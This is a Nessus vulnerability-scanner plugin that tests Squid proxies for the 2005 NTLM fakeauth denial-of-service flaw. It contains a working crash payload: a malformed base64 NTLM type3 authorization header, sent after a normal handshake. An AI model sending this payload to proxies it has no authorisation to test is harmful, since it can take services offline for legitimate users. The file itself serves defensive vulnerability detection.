#
# (C) Tenable Network Security
#
#

if (description) {
  script_id(16163);
  script_bugtraq_id(12220, 12324);
  script_cve_id("CVE-2005-0096", "CVE-2005-0097");
  script_version ("$Revision: 1.5 $");

  name["english"] = "Squid Remote NTLM fakeauth Denial of Service";
  script_name(english:name["english"]);

  desc["english"] = "
The remote SQUID server, an open source Proxy server, is vulnerable 
to a Denial of Service in the fakeauth NTLM authentication module.  

Exploitation of this bug can allow remote attackers to deny access to 
legitimate users.

Squid 2.5*-STABLE are reported vulnerable. 

See also: http://www.squid-cache.org 
Solution: apply the relevant patch from
http://www.squid-cache.org/Versions/v2/2.5/bugs/squid-2.5.STABLE7-fakeauth_auth.patch
Risk factor : Medium";

 script_description(english:desc["english"]);

 summary["english"] = "Squid Remote NTLM fakeauth Denial of Service";

 script_summary(english:summary["english"]);
 script_category(ACT_DESTRUCTIVE_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

 family["english"] = "Denial of Service";

 script_family(english:family["english"]);

 script_dependencies("proxy_use.nasl");
 script_require_ports("Services/http_proxy", 8080, 3128);

 exit(0);
}

include("http_func.inc");


# start script

port = get_kb_item("Services/http_proxy");
if (! port)
	port = 3128;

if(! get_port_state(port))
	exit(0);

host = string("http://www.f0z73", rand() % 65536, "tinker.com/");
req = string (
       "GET " , host , " HTTP/1.1\r\n" ,
      "Proxy-Connection: Keep-Alive\r\n" ,
      "Host: " , host , "\r\n" ,
      "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n" ,
      "Pragma: no-cache\r\n");

type1req = string (req , "Proxy-Authorization: NTLM TlRMTVNTUAABAAAAA7IAAAwADAAsAAAADAAMACAAAABOTkVFU1NTU1VVU1NOTkVFU1NTU1VVU1M=\r\n\r\n");

type3req = string (req , "Proxy-Authorization: NTLM TlRMTVNTUAADAAAAGAAYAGQAAAAYABgAfAAAAAwADABAAAAADAAMAEwAAAAMAAwAWAAAAAAAAADIAAAAAYIAAE5ORUVTU1NTVVVTU05ORUVTU1NTVVVTU05ORUVTU1NTVVVTU0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==\r\n\r\n");

type3req_attack = string (req , "Proxy-Authorization: NTLM TlRMTVNTUAADAAAAGAAYAGQAAAAYABgAfAAAAAwADABAAAAADAAMAEwAAAAMAAwAWAAAAAAAAADIAAAAAYIAAE5ORUVTU1NTVVVTU05ORUVTAFNTVVVTU05ORUVTU1NTVVVTU0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==\r\n\r\n");


soc = open_sock_tcp (port);
if (!soc) exit (0);

# First we send type1 req
send(socket:soc, data:type1req);
r = http_recv(socket:soc);

if (!r) exit(0);


# Checks if SQUID with Proxy-Authenticate: NTLM
if (!egrep(pattern:"^Server: squid/", string:r) || !egrep(pattern:"^Proxy-Authenticate: NTLM", string:r))
  exit(0);

# Now type3req
send(socket:soc, data:type3req);
r = http_recv(socket:soc);

if (!r) exit(0);


close (soc);
soc = open_sock_tcp (port);
if (!soc) exit (0);

# We retry with a malicious request

# First we send type1 req
send(socket:soc, data:type1req);
r = http_recv(socket:soc);

if (!r) exit(0);

# Now type3req
send(socket:soc, data:type3req_attack);
r = http_recv(socket:soc);

if (!r)
  security_hole (port:port);


close (soc);

